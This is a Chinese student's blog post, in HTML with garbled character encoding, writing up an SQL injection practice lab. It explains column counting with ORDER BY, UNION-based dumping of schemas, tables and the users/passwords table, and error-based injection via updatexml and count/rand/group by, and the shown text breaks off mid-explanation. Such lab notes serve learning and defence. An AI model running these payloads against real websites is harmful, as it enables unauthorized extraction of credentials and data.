<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>sqlé¶åœºé‡åš | Hexo</title><meta name="author" content="xiexie"><meta name="copyright" content="xiexie"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="æ­å®Œäº†ä¸ªäººåšå®¢ åšivoryå­¦é•¿ä¸‹å‘çš„ä»»åŠ¡ é‡æ–°åšsqlé¶åœº åŠ ä¸Šè¡¥å……çŸ¥è¯†ç‚¹ sqlæ˜¯æœ€å¼€å§‹å­¦çš„ åˆšå¼€å§‹å­¦çš„æ—¶å€™å°±åªæ˜¯é—®ai åŸºæœ¬è¯­æ³•éƒ½ä¸æ˜¯å¾ˆäº†è§£å°±åœ¨å†™ è¿™é‡Œç›¸å½“äºé‡æ–°å¼€å§‹å§ åŸºç¡€è¯­æ³•ä¹Ÿå°±æ˜¯æœ€åŸºç¡€çš„æŠ€å·§å§  order by ORDER BYæµ‹åˆ—æ•°æ˜¯SQL æ³¨å…¥ä¸­æœ€åŸºç¡€çš„æŠ€å·§   æ ¸å¿ƒåŸç†ORDER BYçš„è¯­æ³•æ”¯æŒä¸¤ç§æ’åºæ–¹å¼ï¼š   æŒ‰åˆ—å &#x2F; åˆ«åæ’åºï¼ˆå¦‚ORDER BY userna">
<meta property="og:type" content="article">
<meta property="og:title" content="sqlé¶åœºé‡åš">
<meta property="og:url" content="http://xiexie-qiuligao.github.io/2025/12/24/sql%E9%9D%B6%E5%9C%BA%E9%87%8D%E5%81%9A/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="æ­å®Œäº†ä¸ªäººåšå®¢ åšivoryå­¦é•¿ä¸‹å‘çš„ä»»åŠ¡ é‡æ–°åšsqlé¶åœº åŠ ä¸Šè¡¥å……çŸ¥è¯†ç‚¹ sqlæ˜¯æœ€å¼€å§‹å­¦çš„ åˆšå¼€å§‹å­¦çš„æ—¶å€™å°±åªæ˜¯é—®ai åŸºæœ¬è¯­æ³•éƒ½ä¸æ˜¯å¾ˆäº†è§£å°±åœ¨å†™ è¿™é‡Œç›¸å½“äºé‡æ–°å¼€å§‹å§ åŸºç¡€è¯­æ³•ä¹Ÿå°±æ˜¯æœ€åŸºç¡€çš„æŠ€å·§å§  order by ORDER BYæµ‹åˆ—æ•°æ˜¯SQL æ³¨å…¥ä¸­æœ€åŸºç¡€çš„æŠ€å·§   æ ¸å¿ƒåŸç†ORDER BYçš„è¯­æ³•æ”¯æŒä¸¤ç§æ’åºæ–¹å¼ï¼š   æŒ‰åˆ—å &#x2F; åˆ«åæ’åºï¼ˆå¦‚ORDER BY userna">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://xiexie-qiuligao.github.io/img/1.png">
<meta property="article:published_time" content="2025-12-23T16:00:00.000Z">
<meta property="article:modified_time" content="2025-12-27T10:10:49.642Z">
<meta property="article:author" content="xiexie">
<meta property="article:tag" content="å­¦ä¹ task">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://xiexie-qiuligao.github.io/img/1.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "sqlé¶åœºé‡åš",
  "url": "http://xiexie-qiuligao.github.io/2025/12/24/sql%E9%9D%B6%E5%9C%BA%E9%87%8D%E5%81%9A/",
  "image": "http://xiexie-qiuligao.github.io/img/1.png",
  "datePublished": "2025-12-23T16:00:00.000Z",
  "dateModified": "2025-12-27T10:10:49.642Z",
  "author": [
    {
      "@type": "Person",
      "name": "xiexie",
      "url": "http://xiexie-qiuligao.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/1.png"><link rel="canonical" href="http://xiexie-qiuligao.github.io/2025/12/24/sql%E9%9D%B6%E5%9C%BA%E9%87%8D%E5%81%9A/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.7/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"ç¹","msgToSimplifiedChinese":"ç°¡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶å¤±è´¥',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"å·²åˆ‡æ¢ä¸ºç¹ä½“ä¸­æ–‡","cht_to_chs":"å·²åˆ‡æ¢ä¸ºç®€ä½“ä¸­æ–‡","day_to_night":"å·²åˆ‡æ¢ä¸ºæ·±è‰²æ¨¡å¼","night_to_day":"å·²åˆ‡æ¢ä¸ºæµ…è‰²æ¨¡å¼","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'sqlé¶åœºé‡åš',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Hexo</span></a><a class="nav-page-title" href="/"><span class="site-name">sqlé¶åœºé‡åš</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  è¿”å›é¦–é¡µ</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">sqlé¶åœºé‡åš</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2025-12-23T16:00:00.000Z" title="å‘è¡¨äº 2025-12-24 00:00:00">2025-12-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2025-12-27T10:10:49.642Z" title="æ›´æ–°äº 2025-12-27 18:10:49">2025-12-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">å­¦ä¹ ç¬”è®°</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">æ€»å­—æ•°:</span><span class="word-count">4.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span><span>19åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">æµè§ˆé‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2025-12-27 18:10:49&quot;}" hidden></div><p>æ­å®Œäº†ä¸ªäººåšå®¢ åšivoryå­¦é•¿ä¸‹å‘çš„ä»»åŠ¡ é‡æ–°åšsqlé¶åœº åŠ ä¸Šè¡¥å……çŸ¥è¯†ç‚¹ sqlæ˜¯æœ€å¼€å§‹å­¦çš„ åˆšå¼€å§‹å­¦çš„æ—¶å€™å°±åªæ˜¯é—®ai åŸºæœ¬è¯­æ³•éƒ½ä¸æ˜¯å¾ˆäº†è§£å°±åœ¨å†™ è¿™é‡Œç›¸å½“äºé‡æ–°å¼€å§‹å§</p>
<h2 id="åŸºç¡€è¯­æ³•"><a href="#åŸºç¡€è¯­æ³•" class="headerlink" title="åŸºç¡€è¯­æ³•"></a>åŸºç¡€è¯­æ³•</h2><p>ä¹Ÿå°±æ˜¯æœ€åŸºç¡€çš„æŠ€å·§å§</p>
<ul>
<li><h4 id="order-by-ORDER-BYæµ‹åˆ—æ•°æ˜¯SQL-æ³¨å…¥ä¸­æœ€åŸºç¡€çš„æŠ€å·§"><a href="#order-by-ORDER-BYæµ‹åˆ—æ•°æ˜¯SQL-æ³¨å…¥ä¸­æœ€åŸºç¡€çš„æŠ€å·§" class="headerlink" title="order by ORDER BYæµ‹åˆ—æ•°æ˜¯SQL æ³¨å…¥ä¸­æœ€åŸºç¡€çš„æŠ€å·§"></a>order by <code>ORDER BY</code>æµ‹åˆ—æ•°æ˜¯<strong>SQL æ³¨å…¥</strong>ä¸­æœ€åŸºç¡€çš„æŠ€å·§</h4></li>
</ul>
<ol>
<li>æ ¸å¿ƒåŸç†<br><code>ORDER BY</code>çš„è¯­æ³•æ”¯æŒä¸¤ç§æ’åºæ–¹å¼ï¼š</li>
</ol>
<ul>
<li>æŒ‰<strong>åˆ—å &#x2F; åˆ«å</strong>æ’åºï¼ˆå¦‚<code>ORDER BY username</code>ï¼‰ï¼›</li>
<li>æŒ‰<strong>ç»“æœé›†çš„åˆ—ç´¢å¼•</strong>æ’åºï¼ˆå¦‚<code>ORDER BY 1</code>è¡¨ç¤ºæŒ‰ç»“æœé›†ç¬¬ 1 åˆ—æ’åºï¼Œ<code>ORDER BY 2</code>æŒ‰ç¬¬ 2 åˆ—ï¼Œä»¥æ­¤ç±»æ¨ï¼‰ã€‚</li>
<li>å¦‚æœ<code>n â‰¤ ç»“æœé›†çš„åˆ—æ•°</code>ï¼šè¯­å¥æ‰§è¡Œæ­£å¸¸ï¼ˆæ— æŠ¥é”™ï¼‰ï¼›</li>
<li>å¦‚æœ<code>n &gt; ç»“æœé›†çš„åˆ—æ•°</code>ï¼šæ•°æ®åº“ä¼šæŠ›å‡º â€œæœªçŸ¥åˆ—â€ ç±»é”™è¯¯ï¼ˆå¦‚ MySQLï¼š<code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code>ï¼‰</li>
</ul>
<ol start="2">
<li>æ ¸å¿ƒç”¨é€” ä¸ºåç»­<code>UNION SELECT</code>æ³¨å…¥é“ºè·¯ï¼š<code>UNION</code>è¦æ±‚å‰åä¸¤ä¸ªæŸ¥è¯¢çš„<strong>åˆ—æ•°å®Œå…¨ä¸€è‡´</strong>ã€<strong>æ•°æ®ç±»å‹å…¼å®¹</strong>ï¼Œå¿…é¡»å…ˆç¡®å®šåŸæŸ¥è¯¢çš„åˆ—æ•°ï¼Œæ‰èƒ½æ„é€ æœ‰æ•ˆçš„<code>UNION</code>è¯­å¥ï¼ˆå¦‚åŸæŸ¥è¯¢åˆ—æ•°ä¸º 2ï¼Œåˆ™æ„é€ <code>UNION SELECT 1,2 --</code>ï¼‰ã€‚</li>
</ol>
<ul>
<li><h4 id="å…ƒæ•°æ®æŸ¥è¯¢ï¼šæŸ¥åº“-è¡¨-åˆ—ï¼ˆæ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼‰"><a href="#å…ƒæ•°æ®æŸ¥è¯¢ï¼šæŸ¥åº“-è¡¨-åˆ—ï¼ˆæ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼‰" class="headerlink" title="å…ƒæ•°æ®æŸ¥è¯¢ï¼šæŸ¥åº“ &#x2F; è¡¨ &#x2F; åˆ—ï¼ˆæ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼‰"></a>å…ƒæ•°æ®æŸ¥è¯¢ï¼šæŸ¥åº“ &#x2F; è¡¨ &#x2F; åˆ—ï¼ˆæ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼‰</h4></li>
</ul>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/2.png"></p>
<ul>
<li><h4 id="æ•°æ®èšåˆ-æ‹¼æ¥"><a href="#æ•°æ®èšåˆ-æ‹¼æ¥" class="headerlink" title="æ•°æ®èšåˆ&#x2F;æ‹¼æ¥"></a>æ•°æ®èšåˆ&#x2F;æ‹¼æ¥</h4></li>
</ul>
<p>GROUP_CONCAT() å¤šè¡Œå­—ç¬¦ä¸²æ‹¼æ¥ä¸ºä¸€è¡Œï¼ˆé»˜è®¤é€—å·åˆ†éš”ï¼‰CONCAT() å¤šåˆ—å­—ç¬¦ä¸²æ‹¼æ¥ä¸ºä¸€è¡Œï¼ˆå•è¡Œå†…æ‹¼æ¥ï¼‰</p>
<ul>
<li><h4 id="é«˜é¢‘å…³é”®å­—"><a href="#é«˜é¢‘å…³é”®å­—" class="headerlink" title="é«˜é¢‘å…³é”®å­—"></a>é«˜é¢‘å…³é”®å­—</h4></li>
</ul>
<p>UNION SELECT è”åˆæŸ¥è¯¢ï¼ˆæ³¨å…¥æ ¸å¿ƒï¼‰<br>LIMIT é™åˆ¶ç»“æœè¡Œæ•°ï¼ˆç²¾å‡†å–æ•°æ®ï¼‰åé¢ä¸¤ä¸ªæ•°å­—æ„å‘³ç€ä»ç¬¬å‡ è¡Œå–å‡ åˆ— å¦‚<code>SELECT password FROM users LIMIT 0,1;</code>ï¼ˆå–ç¬¬ 1 è¡Œå¯†ç ï¼‰<br>COUNT() ç»Ÿè®¡è¡Œæ•°ï¼ˆåˆ¤æ–­è¡¨ä¸­æ•°æ®é‡ï¼‰<code>SELECT COUNT(*) FROM users;</code>ï¼ˆæŸ¥ç”¨æˆ·è¡¨æ€»è®°å½•æ•°ï¼‰</p>
<p>ï¼ˆåé¢çš„å¸ƒå°”ç›²æ³¨ æ—¶é—´ç›²æ³¨ è¿˜æœ‰æŠ¥é”™ ç»•è¿‡é‚£äº›ä¼šåœ¨åšé¢˜åé¢è®°å½•ï¼‰</p>
<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><ol>
<li>æˆ‘è¿™é‡Œæ‰“çš„ctf+ä¸Šé¢çš„é¶åœº æ²¡æœ‰é‡æ–°å»é…ç¯å¢ƒäº† ç°æˆçš„ â€˜é—­åˆ æµ‹å‡ºä¸‰åˆ— ç„¶å-1è®©ä»–ä¸æŸ¥è¯¢ æˆ–è€…æ˜¯åœ¨åé¢åŠ ä¸ªé”™è¯¯æ¡ä»¶ and 1&#x3D;2 union selectä¹‹ç±»çš„</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,database()--+</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°åº“åï¼ˆå½“å‰ä¼šè¯æ­£åœ¨ä½¿ç”¨çš„ï¼‰<br>è¿™æ ·å­æŠŠåº“åæŸ¥å®Œå§ï¼ˆæ‰€æœ‰æ•°æ®åº“ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select group_concat(schema_name)from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
<p>ç»§ç»­æŸ¥è¡¨å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union  select 1,2,group_concat(table_name)from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
<p>åˆ—å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union  select 1,2,group_concat(column_name) from </span><br><span class="line">information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
<p>æ•°æ®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,(select group_concat(username) from users ),(select group_concat(password) from users)--+</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>æ— é—­åˆ ç›´æ¥æ³¨å…¥</li>
<li>â€˜)é—­åˆ</li>
<li>â€œ)é—­åˆ</li>
<li>å¸ƒå°”ç›²æ³¨ ä¹Ÿå°±æ˜¯ä¾é å›æ˜¾æ¥åˆ¤æ–­è¾“å…¥çš„è¯­å¥æ­£ç¡®ä¸å¦ å°±ç”¨acsiiç æ¥åˆ¤æ–­å‡ºå­—ç¬¦ è¿™é‡Œæµ‹å‡ºæ¥æ˜¯â€˜é—­åˆ ç„¶åç¡®å®šè¯­å¥ å¼€å§‹å†™è„šæœ¬ <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/3.png"><br>ç”¨éå†æ¥åš æŠŠæœ€å¼€å§‹åštaskçš„é‚£ä¸ªè„šæœ¬äº¤ç»™aiä¼˜åŒ–äº†</li>
</ol>
<p>å…ˆæŠŠæŠ¥é”™æ³¨å…¥çš„çŸ¥è¯†ç‚¹å†™äº† å› ä¸ºæœ€å¼€å§‹æ‰“è¿™é‡Œæ²¡æœ‰å†™è„šæœ¬ æ˜¯æ‹¿æŠ¥é”™æ³¨å…¥æ¥åšçš„ è¿™é‡Œå…ˆå†™äº†</p>
<ul>
<li><h4 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a><strong>æŠ¥é”™æ³¨å…¥</strong></h4></li>
<li>æ„é€ æ¶æ„ SQL è¯­å¥ï¼Œå¼ºåˆ¶æ•°æ®åº“æ‰§è¡Œæ—¶è§¦å‘è¯­æ³• &#x2F; é€»è¾‘é”™è¯¯ï¼Œä¸”é”™è¯¯ä¿¡æ¯ä¸­ä¼š â€œå¤¹å¸¦â€ æ”»å‡»è€…éœ€è¦çš„æ•æ„Ÿæ•°æ®ï¼ˆåº“åã€è¡¨åã€æ•°æ®ç­‰ï¼‰ï¼›åˆ©ç”¨æ•°æ®åº“å¼€å¯ â€œé”™è¯¯å›æ˜¾â€ çš„ç‰¹æ€§ï¼ˆé¡µé¢æ˜¾ç¤ºåŸç”Ÿé”™è¯¯æç¤ºï¼‰ï¼Œç›´æ¥ä»é”™è¯¯ä¿¡æ¯ä¸­æå–æ•æ„Ÿæ•°æ®ï¼Œæ— éœ€åƒç›²æ³¨é‚£æ ·é€å­—ç¬¦çŒœè§£ã€‚</li>
<li>å‰ææ¡ä»¶ æ•°æ®åº“å¼€å¯é”™è¯¯å›æ˜¾ï¼ˆè¿™ä¸€ç‚¹æ²¡æœ‰çš„è¯ç›´æ¥æ”¾å¼ƒï¼‰</li>
<li>æ ¸å¿ƒé€»è¾‘ æ•°æ®åº“çš„æŠ¥é”™ä¿¡æ¯æœ‰ä¸ªç‰¹ç‚¹ï¼š<strong>å½“æ‰§è¡Œéæ³•æ“ä½œæ—¶ï¼Œé”™è¯¯æç¤ºä¼šæ˜ç¡®æŒ‡å‡º â€œå“ªé‡Œéæ³•â€ï¼Œå¹¶å±•ç¤ºéæ³•å†…å®¹</strong>ã€‚</li>
<li>æœ€å¸¸ç”¨çš„æŠ¥é”™æ–¹å¼ ï¼ˆæœ€ä¸»æµï¼šï¼‰<code>extractvalue()</code>&#x2F;<code>updatexml()</code>æ˜¯ MySQL å¤„ç† XML çš„å‡½æ•°ï¼Œè¦æ±‚ç¬¬äºŒä¸ªå‚æ•°å¿…é¡»æ˜¯<strong>åˆæ³•çš„ XPath è¯­æ³•</strong>ï¼ˆå¦‚<code>/a/b</code>ï¼‰ï¼›è‹¥ä¼ å…¥éæ³• XPathï¼ˆå¦‚åŒ…å«<code>~</code>&#x2F;<code>@</code>ç­‰ç‰¹æ®Šå­—ç¬¦ï¼‰ï¼Œæ•°æ®åº“ä¼šæŠ›å‡º â€œXPATH syntax errorâ€ é”™è¯¯ï¼Œä¸”é”™è¯¯ä¿¡æ¯ä¸­ä¼šæ˜¾ç¤ºéæ³•çš„å‚æ•°å†…å®¹ â€”â€” æ”»å‡»è€…å°†æ•æ„Ÿæ•°æ®æ‹¼æ¥è¿›éæ³•å‚æ•°ï¼Œå°±èƒ½ä»é”™è¯¯ä¸­æå–ä¿¡æ¯ã€‚</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br></pre></td></tr></table></figure>
<ul>
<li><code>0x7e</code>ï¼šåå…­è¿›åˆ¶çš„<code>~</code>ï¼ˆXPath ä¸æ”¯æŒ<code>~</code>ï¼Œç”¨äºè§¦å‘æŠ¥é”™ï¼ŒåŒæ—¶åˆ†éš”æ•æ„Ÿæ•°æ®å’Œé”™è¯¯å‰ç¼€ï¼‰ï¼›</li>
<li><code>concat(0x7e, (select database()), 0x7e)</code>ï¼šæ‹¼æ¥<code>~ + æ•°æ®åº“å + ~</code>ï¼ˆå¦‚<code>~security~</code>ï¼‰ï¼›</li>
<li><code>updatexml</code>æ¥æ”¶éæ³• XPath å‚æ•°ï¼Œè§¦å‘æŠ¥é”™ï¼š<code>XPATH syntax error: &#39;~security~&#39;</code>ï¼›</li>
<li>é¡µé¢æ˜¾ç¤ºè¯¥é”™è¯¯ï¼Œæ”»å‡»è€…ç›´æ¥æ‹¿åˆ°æ•°æ®åº“å<code>security</code>ã€‚<br>è¿™é‡Œé‡æ–°å­¦æŠ¥é”™æ³¨å…¥çš„æ—¶å€™ é‡æ–°å­¦åˆ°äº†ä¸€ä¸ªæ–°çš„æ–¹å¼<br>åŸºäºèšåˆå‡½æ•°å†²çªçš„æŠ¥é”™ï¼ˆcount+rand+group byï¼‰<br>è¯•åœ¨äº†ç¬¬äº”å…³é‡Œé¢ çœŸå¯ä»¥ ç ”ç©¶ä¸€ä¸‹åŸç† ä¸ä¾èµ–extractvalue&#x2F;updatexmlè¿™ä¸¤ä¸ªå‡½æ•°</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2)) as x from information_schema.tables group by x--+</span><br></pre></td></tr></table></figure>
<p>rand() å‡½æ•°ï¼šéšæœºæ•°ç”Ÿæˆï¼ˆæ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼‰<br>åŸºç¡€ç”¨æ³•ï¼šrand() ç”Ÿæˆ 0<del>1 ä¹‹é—´çš„éšæœºæµ®ç‚¹æ•°ï¼ˆå¦‚ 0.123ã€0.987ï¼‰ï¼›<br>å¸¦ç§å­ç”¨æ³•ï¼šrand(0)ï¼ˆç§å­å›ºå®šä¸º 0ï¼‰â€”â€” ç”Ÿæˆçš„éšæœºæ•°åºåˆ—æ˜¯å›ºå®šçš„ã€å¯é‡å¤çš„ï¼ˆè€ŒéçœŸæ­£éšæœºï¼‰ã€‚<br>ä¾‹ï¼šselect rand(0), rand(0)*2 from dual; æ¯æ¬¡æ‰§è¡Œç»“æœéƒ½æ˜¯ 0.15522042769493574ã€0.3104408553898715ï¼›<br>floor(rand(0)*2)ï¼šfloor() æ˜¯å‘ä¸‹å–æ•´ï¼Œrand(0)*2 ç”Ÿæˆ 0</del>2 ä¹‹é—´çš„æµ®ç‚¹æ•°ï¼Œå–æ•´ååªèƒ½æ˜¯ 0 æˆ– 1ï¼ˆè¿™æ˜¯è§¦å‘é‡å¤çš„å…³é”®ï¼‰ã€‚<br>group by + count(<em>) çš„æ‰§è¡Œé€»è¾‘<br>å½“æ‰§è¡Œ select count(</em>), å­—æ®µA from è¡¨ group by å­—æ®µA æ—¶ï¼ŒMySQL ä¼šåšä»¥ä¸‹æ“ä½œï¼š<br>åˆ›å»ºä¸€å¼ ä¸´æ—¶è¡¨ï¼Œç”¨äºå­˜å‚¨ã€Œå­—æ®µ A çš„å€¼ â†’ è®¡æ•°ã€çš„æ˜ å°„ï¼ˆä¸´æ—¶è¡¨çš„ä¸»é”®æ˜¯ å­—æ®µAï¼Œä¸»é”®å”¯ä¸€ï¼‰ï¼›<br>é€è¡Œè¯»å–åŸè¡¨çš„æ•°æ®ï¼Œè®¡ç®— å­—æ®µA çš„å€¼ï¼›<br>æ£€æŸ¥ä¸´æ—¶è¡¨ä¸­æ˜¯å¦å·²æœ‰è¯¥ å­—æ®µA çš„å€¼ï¼š<br>æœ‰ â†’ è®¡æ•° + 1ï¼›<br>æ—  â†’ 